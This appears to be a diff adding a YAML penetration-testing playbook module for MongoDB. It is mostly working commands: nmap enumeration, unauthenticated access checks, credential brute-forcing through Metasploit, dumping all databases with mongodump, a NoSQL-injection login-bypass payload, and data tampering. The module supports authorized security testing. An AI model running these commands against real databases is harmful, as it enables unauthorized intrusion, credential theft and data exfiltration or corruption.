@@ -1,0 +1,81 @@
+module: mongo
+name: MongoDB (27017)
+inputs: [USERS, PASS, OUT]
+
+sections:
+
+  - id: initial
+    name: Initial Access & Detection
+    steps:
+      - id: version
+        text: Confirm live / version + default scripts
+        commands: |
+          nmap -p$PORT -sV -sC $IP
+          nmap -p$PORT --script=mongodb-info $IP
+      - id: connect
+        text: Connect (unauth check first)
+        commands: |
+          mongosh --host $IP --port $PORT
+          mongo $IP:$PORT
+      - id: noauth
+        text: Confirm no-auth access
+        commands: |
+          mongosh --host $IP --port $PORT --eval "db.adminCommand('listDatabases')"
+
+  - id: fingerprint
+    name: Fingerprinting & Enumeration
+    steps:
+      - id: dbs
+        text: List databases / collections
+        commands: |
+          nmap -p$PORT --script=mongodb-databases $IP
+          # show dbs
+          # use <db>; show collections
+      - id: dump_docs
+        text: Read documents / hunt credentials
+        manual: true
+        commands: |
+          # db.<collection>.find().pretty()
+          # db.users.find()
+      - id: authed
+        text: Connect with credentials (when auth is on)
+        commands: |
+          mongosh "mongodb://$USER:$PASS@$IP:$PORT/admin"
+
+  - id: vuln
+    name: Vulnerability Identification
+    steps:
+      - id: cve_map
+        text: Version to CVE mapping
+        commands: |
+          searchsploit mongodb
+
+  - id: creds
+    name: Default & Weak Credentials
+    authorized: true
+    steps:
+      - id: brute
+        text: Credential brute-force
+        commands: |
+          nmap -p$PORT --script=mongodb-brute $IP
+          msfconsole -qx "use auxiliary/scanner/mongodb/mongodb_login; set RHOSTS $IP; set RPORT $PORT; run; exit"
+
+  - id: exploit
+    name: Data Extraction & Post-Access
+    authorized: true
+    steps:
+      - id: dump
+        text: Dump all databases
+        commands: |
+          mongodump --host $IP --port $PORT -o $OUT/mongo
+          mongodump --uri "mongodb://$USER:$PASS@$IP:$PORT" -o $OUT/mongo
+      - id: nosqli
+        text: Note NoSQL-injection surface in fronting apps
+        manual: true
+        commands: |
+          # test app login with: {"user":{"$ne":null},"pass":{"$ne":null}}
+      - id: write
+        text: Tamper / insert (authorized)
+        manual: true
+        commands: |
+          # db.<collection>.insertOne({...}); db.<collection>.updateOne(...)
